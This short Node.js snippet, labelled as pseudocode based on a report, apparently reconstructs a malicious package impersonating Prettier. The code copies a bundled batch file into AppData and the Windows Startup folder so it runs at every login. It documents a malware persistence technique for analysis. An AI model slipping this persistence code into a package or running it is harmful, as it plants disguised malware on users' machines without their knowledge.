// Pseudocode based on report description
const fs = require('fs');
const path = require('path');
const os = require('os');
const batFile = fs.readFileSync(path.join(__dirname, 'prettier.bat'));
const targetPath = path.join(os.homedir(), 'AppData', 'Roaming', 'prettier.bat');
fs.writeFileSync(targetPath, batFile);
// Add to Windows Startup
const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'prettier.bat');
fs.copyFileSync(targetPath, startupPath);
